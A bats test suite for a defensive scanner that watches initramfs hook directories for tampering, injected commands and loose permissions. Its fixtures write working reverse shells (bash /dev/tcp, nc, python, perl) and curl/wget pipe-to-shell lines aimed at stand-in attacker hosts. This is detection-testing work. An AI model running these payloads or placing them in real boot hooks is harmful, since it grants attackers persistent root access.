#!/usr/bin/env bats
# L2 bats functional tests for the initramfs-hooks-watchdog scan script.
#
# update-initramfs runs the scripts in /etc/initramfs-tools/hooks (and
# /usr/share/initramfs-tools/hooks) AS ROOT when the initramfs is rebuilt,
# and their payload executes in early boot before the root filesystem is
# mounted — a powerful, persistent root-exec surface (T1542/T1546). A hook
# that is world-writable / non-root-owned, or contains a command-injection
# pattern, is alert.
#
# Run with: bats packaging/test/L2-initramfs-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd/initramfs-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/hooks"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_INITRD_PROFILE="${PROFILE:-report}" \
    SELFDEF_INITRD_BASELINE="${BASELINE}" \
    SELFDEF_INITRD_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# cryptroot\necho "copy crypto bits"\n' > "${HOOKD}/cryptroot"
}

@test "no initramfs hooks → ok / no_initramfs_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_initramfs_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / initramfs_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"initramfs_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a hook containing an injection pattern → alert / initramfs_hooks_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"initramfs_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hook change → warn / initramfs_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# cryptroot updated\necho "copy crypto modules"\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"initramfs_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — initramfs hook inventory enumerates early-boot root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in initramfs hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in initramfs hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in initramfs hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hook): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable initramfs hook): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/cryptroot"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED hook (attacker drops a new initramfs hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-initramfs-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): initramfs-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1542/T1546 early-boot root exec persistence — injection alert
    # MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/cryptroot"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"initramfs_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # initramfs hook scripts are /bin/sh; # comments. Operator notes
    # about hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# cryptroot\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "copy crypto bits"\n' > "${HOOKD}/cryptroot"
    run_wd
    ! cap | grep -q '"event":"initramfs_hooks_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/initramfs-tools/hooks + /usr/share/initramfs-tools/hooks axes — injection in ANY → alert)" {
    # initramfs-tools sources from BOTH /etc + /usr/share dirs.
    # Attacker may plant in either. Lock multi-dir axis.
    HOOKD2="${TMP}/share-hooks"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/cryptroot"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in initramfs hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config nc reverse-shell variant INVARIANTs across the
    # brain. Lock the netcat axis on the early-boot root-exec
    # persistence surface (T1542/T1546 — initramfs-tools hooks run
    # AS ROOT when initramfs is rebuilt; their payload executes in
    # early boot BEFORE the root filesystem is mounted — the most
    # powerful persistence vector in the brain).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/cryptroot"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on initramfs hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the early-boot
    # root-exec persistence surface (T1542/T1546 — initramfs-tools
    # hooks run AS ROOT when initramfs is rebuilt; payload
    # executes in early boot BEFORE the root filesystem is
    # mounted — the most powerful persistence vector in the brain).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/cryptroot"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl reverse-shell variant — interpreter-rev-shell axis sister to python on initramfs hook surface)" {
    # Sister to the python -c interpreter-rev-shell INVARIANT
    # just above. Perl is the OTHER scripting interpreter
    # commonly present in initramfs images (busybox builds
    # often include perl for udev/busybox-perl fallback).
    # An attacker may swap python→perl to dodge a python-only
    # detector. Locks the perl axis on the early-boot root-exec
    # persistence surface (T1542/T1546 — same trigger
    # surface as the python axis).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e \"use Socket;\\$i=\\\"1.1.1.1\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");\"\n' > "${HOOKD}/cryptroot"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named initramfs hook surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When attacker drops a new
    # initramfs hook (T1542 — Pre-OS Boot persistence via
    # initramfs injection; the planted hook runs AS ROOT in
    # very early boot before the operator can intervene), the
    # hook NAME MUST surface in the JSON sample so operator
    # dashboard routes triage to the right hook.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "loaded"\n' > "${HOOKD}/distinctive-attacker-initramfs-hook"
    chmod 0755 "${HOOKD}/distinctive-attacker-initramfs-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-initramfs-hook'
}

@test "INVARIANT (exec-path under writable-root: initramfs hook invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1542
    # Pre-OS Boot persistence via initramfs hook injection —
    # hook runs AS ROOT in very early boot before operator can
    # intervene. Beyond inline rev-shell payloads, attackers
    # stage benign-looking hooks that invoke a binary in
    # writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\n' > "${HOOKD}/distinctive-attacker-initramfs-hook"
    chmod 0755 "${HOOKD}/distinctive-attacker-initramfs-hook"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on initramfs surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs
    # (shell-init-watchdog, friction-audit, etc.). The
    # initramfs-hooks-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator
    # dashboard parsers (alertmanager / log aggregator routes)
    # branch on the literal severity string; an out-of-set
    # value silently falls through routing and the operator
    # never sees the T1542 Pre-OS Boot persistence alert.
    # Locks parser contract on the early-boot-root-exec
    # detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok path
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/x-rev-shell"
    chmod 0755 "${HOOKD}/x-rev-shell"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: initramfs-hooks-watchdog NEVER deletes hooks — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # initramfs-hooks-watchdog DETECTS T1542 Pre-OS Boot
    # persistence via initramfs hook injection but MUST NEVER
    # emit rm/unlink commands to auto-remediate. The detected
    # initramfs hook may also be operator-legitimate (custom
    # initramfs script for hardware quirk or operator-staged
    # tooling) — silent auto-delete would destroy operator
    # baseline state AND destroy forensic evidence chain.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the initramfs hooks surveillance substrate.
    seed_benign
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/x-rev-shell"
    chmod 0755 "${HOOKD}/x-rev-shell"
    run_wd
    # All hook files MUST remain on disk after detection.
    [ -f "${HOOKD}/x-rev-shell" ]
    # Watchdog source must not call rm on hook paths.
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(HOOKD|HOOK)' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # initramfs-hooks-watchdog runs ON the timer's scheduled
    # fire — scans /usr/share/initramfs-tools/hooks for
    # injection patterns, emits a verdict, then exits. Type=
    # simple would break timer OnUnitActiveSec semantics. Locks
    # oneshot-probe contract on the initramfs-hooks-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd/selfdef-initramfs-hooks.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. initramfs-hooks-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # initramfs-hooks-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # initramfs-hooks-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'initramfs-hooks-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: initramfs-hooks-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. initramfs-hooks-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the initramfs-hooks-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (initramfs-hooks-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The initramfs-hooks-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the initramfs-hooks-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (initramfs-hooks-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # initramfs-hooks-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (initramfs-hooks-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # initramfs-hooks-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (initramfs-hooks-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the initramfs-hooks-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (initramfs-hooks-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # initramfs-hooks-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/initramfs-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
